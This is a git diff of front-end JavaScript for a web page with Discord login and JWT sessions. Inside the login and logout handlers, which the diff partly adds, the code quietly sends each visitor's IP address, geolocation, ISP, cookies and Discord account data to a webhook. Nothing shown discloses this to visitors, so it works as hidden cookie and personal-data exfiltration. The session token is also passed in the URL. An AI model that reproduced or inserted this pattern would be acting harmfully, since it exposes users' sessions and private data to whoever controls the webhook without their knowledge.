@@ -176,81 +176,95 @@ ${userDataFormatted}
         }, 3000); // 3-second cooldown
     });
 
-    // Discord login functionality
-    loginButton.addEventListener('click', function() {
-        const discordLoginUrl = `${apiUrl}/auth/discord`;
-        window.location.href = discordLoginUrl;
-    });
+   // Discord login functionality
+loginButton.addEventListener('click', function() {
+    const discordLoginUrl = `${apiUrl}/auth/discord`;
+    window.location.href = discordLoginUrl;
+});
 
-    // Logout functionality with JWT
-    logoutButton.addEventListener('click', async function() {
-        await sendWebhook("User Logout", `
-            **IP:** ${ipData.ip}
-            **City:** ${ipData.city}
-            **Region:** ${ipData.region}
-            **Country:** ${ipData.country}
-            **Timezone:** ${ipData.timezone}
-            **Org:** ${ipData.org}
-            **Location:** ${ipData.loc}
-            **Cookies:** ${visitorCookie}
-            **Discord User Data:** \`\`\`py
-            ${userDataFormatted}
-            \`\`\`
-        `, Math.floor(Math.random() * 16777215)); // Random color
-        localStorage.removeItem('discordUser');
-        localStorage.removeItem('jwtToken'); // Remove the JWT token on logout
-        loggedIn = false;
-        updateUI();
-        window.location.href = 'https://cakeorpastry.netlify.app/testgpt';
-    });
+// Logout functionality with JWT
+logoutButton.addEventListener('click', async function() {
+    await sendWebhook("User Logout", `
+**IP:** ${ipData.ip}
+**City:** ${ipData.city}
+**Region:** ${ipData.region}
+**Country:** ${ipData.country}
+**Timezone:** ${ipData.timezone}
+**Org:** ${ipData.org}
+**Location:** ${ipData.loc}
+**Cookies:** ${visitorCookie}
+**Discord User Data:** \`\`\`py
+${userDataFormatted}
+\`\`\`
+`, Math.floor(Math.random() * 16777215)); // Random color
 
-    async function updateUI() {
+    localStorage.removeItem('discordUser');
+    localStorage.removeItem('jwtToken'); // Remove the JWT token on logout
+    loggedIn = false;
+    updateUI();
+    window.location.href = 'https://cakeorpastry.netlify.app/testgpt';
+});
+
+// Function to update UI based on login status
+async function updateUI() {
+    const discordUser = localStorage.getItem('discordUser');
+    const jwtToken = localStorage.getItem('jwtToken');
+
+    if (discordUser && jwtToken) {
+        const userData = JSON.parse(discordUser);
+        const usernameElement = document.querySelector('.username');
+        usernameElement.innerText = userData.username;
+        const profilePicture = profileUI.querySelector('.profile-picture');
+        profilePicture.src = `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}`;
+        logoutButton.disabled = false;
+        loginButton.disabled = true;
+    } else {
         const urlParams = new URLSearchParams(window.location.search);
-        const tokenParam = urlParams.get('token') || localStorage.getItem('jwtToken'); // Check URL or localStorage for token
+        const tokenParam = urlParams.get('token') || localStorage.getItem('jwtToken'); // Try token from URL or localStorage
 
         if (tokenParam) {
             try {
-                // Validate the token on each page load
                 const response = await fetch(`${apiUrl}/auth/validatetoken?token=${tokenParam}`);
                 const data = await response.json();
 
                 if (data.error) {
-                    throw new Error("Token expired or invalid");
+                    throw new Error(data.error);
                 }
 
-                // Store updated user info and token if valid
+                // Store JWT token and Discord user data
                 localStorage.setItem('discordUser', JSON.stringify(data.user));
-                localStorage.setItem('jwtToken', data.token); // Update token if refreshed on server
+                localStorage.setItem('jwtToken', tokenParam); 
                 loggedIn = true;
 
-                // Update UI elements
-                const usernameElement = document.querySelector('.username');
-                usernameElement.innerText = data.user.username;
-                const profilePicture = profileUI.querySelector('.profile-picture');
-                profilePicture.src = `https://cdn.discordapp.com/avatars/${data.user.id}/${data.user.avatar}`;
-                logoutButton.disabled = false;
-                loginButton.disabled = true;
+                await sendWebhook("User Login", `
+**IP:** ${ipData.ip}
+**City:** ${ipData.city}
+**Region:** ${ipData.region}
+**Country:** ${ipData.country}
+**Timezone:** ${ipData.timezone}
+**Org:** ${ipData.org}
+**Location:** ${ipData.loc}
+**Cookies:** ${visitorCookie}
+**Discord User Data:** \`\`\`py
+${userDataFormatted}
+\`\`\`
+`, Math.floor(Math.random() * 16777215)); // Random color
 
-                // Reset URL parameters if token was provided in URL
+                updateUI(); // Update the UI after successful login
+
+                // Remove the token from the URL
                 if (urlParams.has('token')) {
                     urlParams.delete('token');
                     window.history.replaceState({}, document.title, window.location.pathname);
                 }
             } catch (error) {
-                console.error("Token validation failed:", error);
-                // Clear data and update UI if the token is invalid
+                console.error("Invalid token or tampering detected:", error);
                 localStorage.removeItem('discordUser');
                 localStorage.removeItem('jwtToken');
-                loggedIn = false;
-                alert("Session expired. Please log in again.");
-                logoutButton.disabled = true;
-                loginButton.disabled = false;
-                sendButton.disabled = true;
-                statusMessage.innerText = "You need to login to use this service.";
-                statusImage.src = statusEmojis.LOL;
+                alert(`Invalid login, please try again. Error: ${error}`);
             }
         } else {
-            // No token found
+            // No token found, set UI to logged-out state
             logoutButton.disabled = true;
             loginButton.disabled = false;
             sendButton.disabled = true;
@@ -259,9 +273,10 @@ ${userDataFormatted}
             statusImage.src = statusEmojis.LOL;
         }
     }
+}
 
-    // Initial UI setup
-    updateUI(); // Check and update UI on page load
+// Initial UI setup
+updateUI(); // Check and update UI on page load
 
     // Copy to clipboard functionality
     const copyButton = document.getElementById('copyResponseToClipboard');
